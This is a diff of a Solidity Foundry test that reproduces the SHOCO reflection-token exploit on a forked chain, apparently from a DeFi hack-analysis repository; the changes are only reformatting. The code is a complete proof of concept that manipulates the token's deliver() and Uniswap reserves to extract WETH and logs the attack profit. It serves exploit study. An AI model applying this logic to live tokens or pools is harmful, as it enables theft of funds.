@@ -15,8 +15,12 @@ import "./../interface.sol";
 // https://github.com/Autosaida/DeFiHackAnalysis/blob/master/analysis/230119_SHOCO.md
 
 interface IReflection is IERC20 {
-    function deliver(uint256 amount) external;
-    function tokenFromReflection(uint256 rAmount) external view returns(uint256);
+    function deliver(
+        uint256 amount
+    ) external;
+    function tokenFromReflection(
+        uint256 rAmount
+    ) external view returns (uint256);
 }
 
 contract SHOCOAttacker is Test {
@@ -36,53 +40,56 @@ contract SHOCOAttacker is Test {
         bytes32 slotValue = vm.load(targetContract, keccak256(abi.encode(key, mapSlot)));
         return uint256(slotValue);
     }
-    
+
     // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
-    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
-        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
-        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
-        uint amountInWithFee = amountIn * 997;
-        uint numerator = amountInWithFee * reserveOut;
-        uint denominator = (reserveIn *1000) + amountInWithFee;
+    function getAmountOut(
+        uint256 amountIn,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) internal pure returns (uint256 amountOut) {
+        require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
+        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = (reserveIn * 1000) + amountInWithFee;
         amountOut = numerator / denominator;
     }
 
     // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
-    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
-        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
-        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
-        uint numerator = reserveIn * amountOut * 1000;
-        uint denominator = (reserveOut-amountOut) * 997;
+    function getAmountIn(
+        uint256 amountOut,
+        uint256 reserveIn,
+        uint256 reserveOut
+    ) internal pure returns (uint256 amountIn) {
+        require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
+        require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
+        uint256 numerator = reserveIn * amountOut * 1000;
+        uint256 denominator = (reserveOut - amountOut) * 997;
         amountIn = (numerator / denominator) + 1;
     }
 
     function testExploit() external {
-        uint attackBlockNumber = 16440978;
+        uint256 attackBlockNumber = 16_440_978;
         vm.rollFork(attackBlockNumber);
         emit log_named_decimal_uint("WETH balance", weth.balanceOf(address(shoco_weth)), weth.decimals());
         deal(address(weth), address(this), 2000 ether);
 
         uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));
         uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
-        uint256 rAmountOut = rTotal-rExcluded;
-        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1*10**9;
+        uint256 rAmountOut = rTotal - rExcluded;
+        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1 * 10 ** 9;
 
-        (uint reserve0, uint reserve1, ) = shoco_weth.getReserves();
+        (uint256 reserve0, uint256 reserve1,) = shoco_weth.getReserves();
         uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);
         emit log_named_decimal_uint("WETH amountIn", wethAmountIn, weth.decimals());
         weth.transfer(address(shoco_weth), wethAmountIn);
 
-        shoco_weth.swap(
-            shocoAmountOut,
-            0, 
-            address(this),
-            ""
-        );
+        shoco_weth.swap(shocoAmountOut, 0, address(this), "");
 
-        shoco.deliver(shoco.balanceOf(address(this))*99999/100000);
+        shoco.deliver(shoco.balanceOf(address(this)) * 99_999 / 100_000);
 
-        (reserve0, reserve1, ) = shoco_weth.getReserves();
-        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth))-reserve0, reserve0, reserve1);
+        (reserve0, reserve1,) = shoco_weth.getReserves();
+        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth)) - reserve0, reserve0, reserve1);
         shoco_weth.swap(0, wethAmountOut, address(this), "");
         if (wethAmountIn < wethAmountOut) {
             emit log_named_decimal_uint("Attack profit:", wethAmountOut - wethAmountIn, weth.decimals());
@@ -90,5 +97,4 @@ contract SHOCOAttacker is Test {
             emit log_named_decimal_uint("Attack loss:", wethAmountIn - wethAmountOut, weth.decimals());
         }
     }
-    
 }
